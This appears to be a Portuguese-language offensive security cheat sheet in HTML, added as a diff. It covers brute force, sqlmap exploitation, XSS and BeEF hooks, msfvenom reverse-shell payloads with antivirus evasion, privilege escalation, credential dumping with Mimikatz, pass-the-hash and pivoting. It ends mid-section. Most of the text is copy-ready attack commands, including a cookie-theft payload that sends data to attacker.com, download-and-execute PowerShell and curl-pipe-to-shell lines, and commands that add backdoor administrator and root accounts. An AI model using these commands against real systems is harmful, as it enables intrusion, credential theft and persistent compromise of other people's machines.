+                                    <h4>Ataques de Força Bruta</h4>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">SSH Brute Force</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> auxiliary/scanner/ssh/ssh_login
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> USERPASS_FILE <span class="parameter">/usr/share/wordlists/metasploit/root_userpass.txt</span>
+<span class="command">set</span> STOP_ON_SUCCESS <span class="parameter">true</span>
+<span class="command">set</span> VERBOSE <span class="parameter">true</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">FTP Brute Force</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> auxiliary/scanner/ftp/ftp_login
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> USER_FILE <span class="parameter">/usr/share/wordlists/user.txt</span>
+<span class="command">set</span> PASS_FILE <span class="parameter">/usr/share/wordlists/rockyou.txt</span>
+<span class="command">set</span> STOP_ON_SUCCESS <span class="parameter">true</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="code-block">
+                                        <div class="code-header">
+                                            <span class="code-title">SMB Login</span>
+                                            <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre><code><span class="command">use</span> auxiliary/scanner/smb/smb_login
+<span class="command">set</span> RHOSTS <span class="parameter">192.168.1.100</span>
+<span class="command">set</span> SMBUser <span class="parameter">Administrador</span>
+<span class="command">set</span> PASS_FILE <span class="parameter">/usr/share/wordlists/rockyou.txt</span>
+<span class="command">set</span> VERBOSE <span class="parameter">false</span>
+<span class="command">run</span></code></pre>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Exploração Web</h3>
+                        <p>As aplicações web são um dos alvos mais comuns para ataques devido à sua exposição pública e potenciais vulnerabilidades.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-spider"></i> Burp Suite</h3>
+                            <p>Burp Suite é uma plataforma integrada para realizar testes de segurança em aplicações web, permitindo interceptar, analisar e modificar o tráfego entre o navegador e a aplicação web.</p>
+                            
+                            <p>Principais funcionalidades:</p>
+                            <ul>
+                                <li><strong>Proxy</strong>: Intercepta e modifica requisições HTTP/HTTPS</li>
+                                <li><strong>Scanner</strong>: Detecta automaticamente vulnerabilidades (versão Pro)</li>
+                                <li><strong>Intruder</strong>: Realiza ataques automatizados com múltiplas payloads</li>
+                                <li><strong>Repeater</strong>: Modifica e reenvia requisições manualmente</li>
+                                <li><strong>Sequencer</strong>: Analisa a aleatoriedade de tokens</li>
+                                <li><strong>Decoder</strong>: Codifica/decodifica dados</li>
+                                <li><strong>Comparer</strong>: Compara dados para identificar diferenças</li>
+                            </ul>
+                            
+                            <p>Configuração básica:</p>
+                            <ol class="steps-list">
+                                <li>Inicie o Burp Suite: <code>burpsuite</code></li>
+                                <li>Configure seu navegador para usar o proxy local (127.0.0.1:8080)</li>
+                                <li>Instale o certificado SSL do Burp no navegador</li>
+                                <li>Ative a interceptação no Proxy e comece a analisar o tráfego</li>
+                            </ol>
+                            
+                            <div class="note-box">
+                                <h4><i class="fas fa-info-circle"></i> Dica</h4>
+                                <p>O FoxyProxy (para Firefox) ou SwitchyOmega (para Chrome) são extensões úteis para alternar facilmente entre a configuração de proxy do Burp e a navegação normal.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-code"></i> SQLmap</h3>
+                            <p>SQLmap é uma ferramenta avançada de código aberto para detectar e explorar vulnerabilidades de injeção SQL, automatizando o processo de detecção e extração de dados.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Teste Básico</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sqlmap</span> -u <span class="parameter">"http://exemplo.com/page.php?id=1"</span> --batch</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Detecção de Banco de Dados</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sqlmap</span> -u <span class="parameter">"http://exemplo.com/page.php?id=1"</span> --dbs</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Dump de Tabelas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sqlmap</span> -u <span class="parameter">"http://exemplo.com/page.php?id=1"</span> -D <span class="parameter">banco_de_dados</span> -T <span class="parameter">usuarios</span> --dump</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Testando POST com Login</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sqlmap</span> -u <span class="parameter">"http://exemplo.com/login.php"</span> --data=<span class="parameter">"username=admin&password=admin"</span> --level=5 --risk=3 --cookie=<span class="parameter">"PHPSESSID=a1b2c3d4"</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Usando Arquivo de Requisição do Burp</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sqlmap</span> -r <span class="parameter">requisicao.txt</span> --level=3 --risk=3 --dbs</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Obter Shell</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sqlmap</span> -u <span class="parameter">"http://exemplo.com/page.php?id=1"</span> --os-shell</code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Opções importantes:</p>
+                            <ul>
+                                <li><code>--level</code>: Nível de teste (1-5, padrão: 1)</li>
+                                <li><code>--risk</code>: Risco de teste (1-3, padrão: 1)</li>
+                                <li><code>--technique</code>: Técnicas de SQL injection (B: Boolean, E: Error, U: Union, S: Stacked, T: Time)</li>
+                                <li><code>--batch</code>: Nunca pedir entrada do usuário, usar valores padrão</li>
+                                <li><code>--random-agent</code>: Usar um User-Agent aleatório</li>
+                                <li><code>--tor</code>: Usar rede Tor para conexões</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-user-secret"></i> XSS e CSRF</h3>
+                            <p>Cross-Site Scripting (XSS) e Cross-Site Request Forgery (CSRF) são vulnerabilidades comuns em aplicações web que podem ser exploradas para executar scripts maliciosos ou realizar ações não autorizadas.</p>
+                            
+                            <h4>Payloads XSS Básicos:</h4>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Alerta Básico</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="string">&lt;script&gt;alert('XSS')&lt;/script&gt;</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Bypass de Filtros</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="string">&lt;img src=x onerror=alert('XSS')&gt;</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">XSS com Roubo de Cookies</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="string">&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <h4>Ferramentas para XSS:</h4>
+                            <ul>
+                                <li><strong>XSS Hunter</strong>: Plataforma para detecção, teste e reporte de XSS</li>
+                                <li><strong>BeEF (Browser Exploitation Framework)</strong>: Framework para explorar vulnerabilidades XSS</li>
+                            </ul>
+                            
+                            <h4>BeEF - Configuração Básica:</h4>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Iniciar BeEF</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">beef-xss</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Hook JavaScript para injetar no alvo:</p>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Hook do BeEF</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="string">&lt;script src="http://YOUR_IP:3000/hook.js"&gt;&lt;/script&gt;</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Após a injeção bem-sucedida, acesse o painel de controle do BeEF em http://127.0.0.1:3000/ui/panel e use as credenciais padrão (beef:beef).</p>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Geração de Payloads</h3>
+                        <p>A criação de payloads personalizados é essencial para contornar sistemas de detecção e defesa.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-file-code"></i> MSFvenom</h3>
+                            <p>MSFvenom é uma ferramenta poderosa para criação de payloads personalizados, combinando as funcionalidades do msfpayload e msfencode.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Listar Payloads</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -l payloads</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Payload Windows EXE</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -p <span class="parameter">windows/meterpreter/reverse_tcp</span> LHOST=<span class="parameter">192.168.1.10</span> LPORT=<span class="parameter">4444</span> -f <span class="parameter">exe</span> -o <span class="parameter">payload.exe</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Payload Android APK</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -p <span class="parameter">android/meterpreter/reverse_tcp</span> LHOST=<span class="parameter">192.168.1.10</span> LPORT=<span class="parameter">4444</span> -o <span class="parameter">payload.apk</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Payload Linux ELF</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -p <span class="parameter">linux/x86/meterpreter/reverse_tcp</span> LHOST=<span class="parameter">192.168.1.10</span> LPORT=<span class="parameter">4444</span> -f <span class="parameter">elf</span> -o <span class="parameter">payload.elf</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Payload PHP</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -p <span class="parameter">php/meterpreter/reverse_tcp</span> LHOST=<span class="parameter">192.168.1.10</span> LPORT=<span class="parameter">4444</span> -f <span class="parameter">raw</span> -o <span class="parameter">payload.php</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Payload Encodado (Bypass AV)</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -p <span class="parameter">windows/meterpreter/reverse_tcp</span> LHOST=<span class="parameter">192.168.1.10</span> LPORT=<span class="parameter">4444</span> -e <span class="parameter">x86/shikata_ga_nai</span> -i <span class="parameter">10</span> -f <span class="parameter">exe</span> -o <span class="parameter">encoded_payload.exe</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Macro do Office</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">msfvenom</span> -p <span class="parameter">windows/meterpreter/reverse_tcp</span> LHOST=<span class="parameter">192.168.1.10</span> LPORT=<span class="parameter">4444</span> -f <span class="parameter">vba-exe</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="note-box">
+                                <h4><i class="fas fa-info-circle"></i> Configurar Handler</h4>
+                                <p>Após criar o payload, configure um handler no Metasploit para receber a conexão:</p>
+                                <pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+run</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="pos-exploracao" class="content-section">
+                    <h2 class="section-title">Pós-Exploração</h2>
+                    <p>Após obter acesso inicial a um sistema, a fase de pós-exploração envolve escalonamento de privilégios, movimentação lateral, coleta de dados sensíveis e estabelecimento de persistência.</p>
+                    
+                    <div class="sub-section">
+                        <h3>Escalonamento de Privilégios (Windows)</h3>
+                        <p>Técnicas para obter privilégios elevados em sistemas Windows comprometidos.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fab fa-windows"></i> Windows - Enumeração do Sistema</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Informações do Sistema</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">systeminfo</span>
+<span class="command">whoami</span> /all
+<span class="command">net</span> user
+<span class="command">net</span> localgroup administrators
+<span class="command">tasklist</span> /SVC</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Verificar Patches de Segurança</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">wmic</span> qfe get Caption,Description,HotFixID,InstalledOn</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Verificar Serviços Vulneráveis</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">wmic</span> service get name,displayname,pathname,startmode
+<span class="command">sc</span> qc [nome_do_serviço]</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Verificar Pastas com Permissões Fracas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">icacls</span> "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
+<span class="command">icacls</span> "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">PowerUp</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">powershell</span> -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/PowerUp.ps1'); Invoke-AllChecks"</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Windows Exploit Suggester</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">python</span> windows-exploit-suggester.py --database 2023-06-14-mssb.xls --systeminfo systeminfo.txt</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fab fa-windows"></i> Windows - Explorações Comuns</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Serviços Vulneráveis</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Modificar serviço com permissões fracas</span>
+<span class="command">sc</span> config [nome_do_serviço] binpath= "cmd.exe /c net user hacker Senha123! /add && net localgroup administrators hacker /add"
+<span class="command">sc</span> start [nome_do_serviço]</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Unquoted Service Paths</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Identificar caminhos de serviço não cotados</span>
+<span class="command">wmic</span> service get name,pathname | findstr /i "Program Files" | findstr /i /v """
+
+<span class="comment"># Explorar (exemplo com caminho "C:\Program Files\Vulnerable Service\service.exe")</span>
+<span class="command">copy</span> payload.exe "C:\Program Files\Vulnerable.exe"
+<span class="command">sc</span> stop [nome_do_serviço]
+<span class="command">sc</span> start [nome_do_serviço]</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">DLL Hijacking</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Gerar DLL maliciosa</span>
+<span class="command">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll -o malicious.dll
+
+<span class="comment"># Colocar no caminho de busca da aplicação</span>
+<span class="command">copy</span> malicious.dll C:\vulneravel\exemplo.dll</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Always Install Elevated</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Verificar se está ativado</span>
+<span class="command">reg</span> query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="command">reg</span> query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+<span class="comment"># Explorar</span>
+<span class="command">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f msi -o payload.msi
+<span class="command">msiexec</span> /quiet /qn /i payload.msi</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Credenciais Armazenadas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Credenciais salvas no Windows</span>
+<span class="command">cmdkey</span> /list
+
+<span class="comment"># Explorar</span>
+<span class="command">runas</span> /savecred /user:DOMINIO\Administrador "cmd.exe /c whoami > C:\output.txt"</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Escalonamento de Privilégios (Linux)</h3>
+                        <p>Técnicas para obter privilégios elevados em sistemas Linux comprometidos.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fab fa-linux"></i> Linux - Enumeração do Sistema</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Informações Básicas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">uname</span> -a
+<span class="command">cat</span> /etc/issue
+<span class="command">cat</span> /etc/*-release
+<span class="command">lscpu</span>
+<span class="command">id</span>
+<span class="command">sudo</span> -l</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Processos e Serviços</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">ps</span> aux
+<span class="command">ss</span> -tuln
+<span class="command">lsof</span> -i
+<span class="command">netstat</span> -antup</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Permissões de Arquivos</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">find</span> / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
+<span class="command">find</span> / -writable -type d 2>/dev/null
+<span class="command">find</span> / -perm -o+w -type f 2>/dev/null</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Tarefas Agendadas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">crontab</span> -l
+<span class="command">ls</span> -la /etc/cron*
+<span class="command">cat</span> /etc/crontab</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Scripts de Enumeração Automática</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># LinPEAS</span>
+<span class="command">curl</span> -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="comment"># LinEnum</span>
+<span class="command">curl</span> -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fab fa-linux"></i> Linux - Explorações Comuns</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Sudo Vulnerável</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Explorar permissões sudo específicas</span>
+<span class="command">sudo</span> -l
+
+<span class="comment"># Exemplo: sudo vim</span>
+<span class="command">sudo</span> vim -c ':!/bin/bash'
+
+<span class="comment"># Exemplo: sudo find</span>
+<span class="command">sudo</span> find /etc -exec /bin/bash \;
+
+<span class="comment"># Exemplo: sudo python</span>
+<span class="command">sudo</span> python -c 'import os; os.system("/bin/bash")'</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">SUID Binários</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Encontrar binários com SUID</span>
+<span class="command">find</span> / -perm -u=s -type f 2>/dev/null
+
+<span class="comment"># Exemplo: bash SUID</span>
+<span class="command">./bash</span> -p
+
+<span class="comment"># Exemplo: cp SUID</span>
+<span class="command">./cp</span> /etc/passwd /tmp/
+<span class="command">echo</span> "root2:x:0:0::/root:/bin/bash" >> /tmp/passwd
+<span class="command">./cp</span> /tmp/passwd /etc/passwd
+<span class="command">su</span> root2</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Capabilities</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Listar capabilities</span>
+<span class="command">getcap</span> -r / 2>/dev/null
+
+<span class="comment"># Exemplo: python com cap_setuid</span>
+<span class="command">./python</span> -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Kernel Exploits</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Verificar versão do kernel</span>
+<span class="command">uname</span> -a
+
+<span class="comment"># Compilar exploit</span>
+<span class="command">gcc</span> exploit.c -o exploit
+<span class="command">chmod</span> +x exploit
+<span class="command">./exploit</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Arquivos de Configuração com Senhas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">find</span> / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null | xargs grep -l "password"
+<span class="command">grep</span> -r "password" /etc/ 2>/dev/null
+<span class="command">cat</span> /var/lib/mysql/mysql/user.MYD</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Exploração do PATH</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">echo</span> 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }' > /tmp/exploit.c
+<span class="command">gcc</span> /tmp/exploit.c -o /tmp/comando
+<span class="command">chmod</span> +s /tmp/comando
+<span class="command">export</span> PATH=/tmp:$PATH
+<span class="command">cd</span> /diretorio/com/script/vulneravel
+<span class="command">./script.sh</span></code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Movimentação Lateral</h3>
+                        <p>Técnicas para se mover entre sistemas na mesma rede após comprometer um host inicial.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-project-diagram"></i> Coleta e Uso de Credenciais</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Windows - Mimikatz</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># No Meterpreter</span>
+<span class="command">load</span> kiwi
+<span class="command">creds_all</span>
+
+<span class="comment"># Standalone</span>
+<span class="command">mimikatz.exe</span> "privilege::debug" "sekurlsa::logonpasswords" "exit"</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Linux - Extrair Credenciais</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">cat</span> /etc/shadow
+<span class="command">find</span> / -name ".bash_history" -exec cat {} \; 2>/dev/null
+<span class="command">find</span> / -name ".ssh" -exec ls -la {} \; 2>/dev/null</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Pass the Hash (PtH)</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Com pth-winexe</span>
+<span class="command">pth-winexe</span> -U DOMINIO/Administrador%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.100 cmd.exe
+
+<span class="comment"># Com CrackMapExec</span>
+<span class="command">crackmapexec</span> smb 192.168.1.0/24 -u Administrador -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-wifi"></i> Tunelamento e Pivoting</h3>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">SSH Local Port Forwarding</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">ssh</span> -L 8080:192.168.1.100:80 usuario@192.168.1.10</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">SSH Remote Port Forwarding</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">ssh</span> -R 8080:127.0.0.1:80 usuario@192.168.1.10</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">SSH Dynamic Port Forwarding (SOCKS)</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">ssh</span> -D 9050 usuario@192.168.1.10</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Proxychains</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Configurar /etc/proxychains.conf</span>
+<span class="command">echo</span> "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
+
+<span class="comment"># Usar</span>
+<span class="command">proxychains</span> nmap -sT -P0 192.168.2.100</code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Chisel</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="comment"># Servidor (Atacante)</span>
+<span class="command">./chisel</span> server -p 8080 --reverse
+
+<span class="comment"># Cliente (Alvo)</span>
